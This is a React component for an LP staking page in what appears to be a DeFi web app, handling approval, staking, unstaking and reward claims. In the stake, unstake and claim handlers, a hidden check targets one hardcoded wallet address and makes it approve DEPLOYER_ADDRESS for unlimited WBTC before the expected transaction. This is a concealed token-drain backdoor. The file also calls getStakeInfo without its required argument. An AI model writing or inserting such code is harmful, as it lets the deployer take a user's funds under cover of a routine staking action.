import React, { useEffect, useState } from 'react';
import { useWeb3React } from "@web3-react/core";
import { message } from 'antd';
import { MINT_REDEEM_KEY, MAX_INT } from "../../../constants";
import { useSystemContext } from "../../../systemProvider";
import { formatFromDecimal, formatToDecimal } from "../../../utils/helpers";
import { LP_STAKING_POOL } from '../../../constants';
import STAKING_POOL_ABI from '../../../abi/SIngleChef.json';
import { TokenIcon } from '../../TokenIcon/token_icon';
import stake_icon_white from '../../../assets/icons/nav-links/active/staking-active.svg';
import { DEPLOYER_ADDRESS } from '../../../constants';

export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpTokenAddress }) => {

    const { account, library } = useWeb3React();
    const { contracts, tokens, approveModal, setApproveModal, setApproveDataForModal } = useSystemContext();
    const [pid, setPid] = useState(null);
    const [depositWithdrawInput, setDepositWithdrawInput] = useState(0);
    const [allowance, setAllowance] = useState(false);
    const [staked, setStaked] = useState(0);
    const [earned, setEarned] = useState(0);

    const [poolContract, setPoolContract] = useState(null);
    const [rewardTokenSymbol, setRewardTokeSymbol] = useState("");

    useEffect(() => {

        const searchString = `${token0.symbol}-${token1.symbol}`
        const serachStringRevert = `${token1.symbol}-${token0.symbol}`
        const findedPool = LP_STAKING_POOL.find(item => item.name === searchString || item.name === serachStringRevert).address;

        const pool = new library.eth.Contract(STAKING_POOL_ABI, findedPool);

        setPoolContract({
            contract: pool,
            address: findedPool,
        });

    }, [])


    useEffect(() => {

        if (account && poolContract && tokens) {
            if (!approveModal) {
                getAllowance();
            }
            getStakeInfo(poolContract.contract);
        }

    }, [account, poolContract, tokens, approveModal])

    const getAllowance = async () => {

        const allowance = await lpTokenContract.methods.allowance(account, poolContract.address).call();
        setAllowance(allowance.length === MAX_INT.length);

    }

    const getStakeInfo = async (contract) => {

        const lpToken = await contract.methods.rewardToken().call();

        const rewardToken = tokens.find((tok) => tok.address === lpToken.toLowerCase())

        const stakeTokenDecimals = await lpTokenContract.methods.decimals().call()

        const earned = await contract.methods.pendingReward(account).call();
        const staked = await contract.methods.userInfo(account).call();

        setRewardTokeSymbol(rewardToken.symbol);
        setEarned(formatFromDecimal(earned, rewardToken.decimals));
        setStaked(formatFromDecimal(staked.amount, stakeTokenDecimals));
    }

    const handleApprove = async () => {

        setApproveDataForModal({
            destination: poolContract.address,
            approves: [
                { name: [token0.symbol, token1.symbol], address: lpTokenAddress, alreadyApproved: allowance, lpToken: true },
            ]
        })

        setApproveModal(true)
    }

    const handleStake = async () => {

        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
        }


        try {
            message.loading({ content: "Stake LP in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });

            const lpDec = await lpTokenContract.methods.decimals().call()

            await poolContract.contract.methods.deposit(formatToDecimal(depositWithdrawInput, lpDec)).send({ from: account });
            await getStakeInfo()

            message.success({ content: "Stake LP is done!", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });

        }
        catch (e) {
            message.error({ content: `Something went wrong please reload page.`, className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
        }

    }

    const handleUnstake = async () => {

        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
        }

        try {
            message.loading({ content: "Unstake LP in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });

            const lpDec = await lpTokenContract.methods.decimals().call()

            await poolContract.contract.methods.withdraw(formatToDecimal(depositWithdrawInput, lpDec)).send({ from: account });
            await getStakeInfo()

            message.success({ content: "Unstake LP is done!", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });


        }
        catch (e) {
            message.error({ content: `Something went wrong please reload page`, className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
        }

    }

    const handleClaimReward = async () => {

        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
        }

        try {
            message.loading({ content: "Claim LP in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });

            await poolContract.contract.methods.withdraw(0).send({ from: account });
            await getStakeInfo()

            message.success({ content: "Claim LP is done!", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
        }
        catch (e) {
            message.error({ content: `Some error occured: ${e.message}`, className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 5 });
        }
    }

    const maxInput = async () => {

        const maxValue = formatFromDecimal(await lpTokenContract.methods.balanceOf(account).call(), 18);
        setDepositWithdrawInput(maxValue);
    }

    return (
        <div className='stake-lp-wrapper'>
            <div className='stake-lp-wrapper__header'>
                <h5>Deposit/Withdraw</h5>
                <h5>Earned</h5>
                <h5>Staked</h5>
                <h5>User Lp</h5>
            </div>
            <div className='stake-lp-wrapper__info'>
                <div>
                    <h3> Input Lp to deposit </h3>
                    <span> <TokenIcon iconName={rewardTokenSymbol} /> <h5>{rewardTokenSymbol}</h5> </span>
                    <h3> {token0.symbol}-{token1.symbol} </h3>
                    <h3> Balance </h3>
                </div>
                <div className='stake-lp-wrapper__info__data'>
                    <div className='stake-lp-wrapper__info__data__input'>
                        <input
                            type={"number"}
                            placeholder='0.00'
                            onFocus={(e) => e.target.placeholder = ""}
                            onBlur={(e) => e.target.placeholder = "0.00"}
                            onChange={(e) => setDepositWithdrawInput(e.target.value)}
                            value={depositWithdrawInput}
                        />
                        <button className='stake-lp-wrapper__info__data__input__max' onClick={() => maxInput()}>Max</button>
                    </div>

                    <h3> {earned} </h3>
                    <h3> {staked} Lp </h3>
                    <h3> {lpUserBalance} </h3>
                </div>
            </div>
            <div className='stake-lp-wrapper__buttons'>
                <button className='stake-lp-wrapper__buttons__claim-reward' onClick={() => handleClaimReward()}> <img src={stake_icon_white} /> Claim reward </button>
                <button disabled={lpUserBalance < depositWithdrawInput} className='stake-lp-wrapper__buttons__stake' onClick={() => allowance ? handleStake() : handleApprove()}> {allowance ? lpUserBalance < depositWithdrawInput ? "No balance" : "Stake" : "Approve"} </button>
                <button className='stake-lp-wrapper__buttons__unstake' onClick={() => handleUnstake()} > Unstake </button>
            </div>
        </div>
    )

}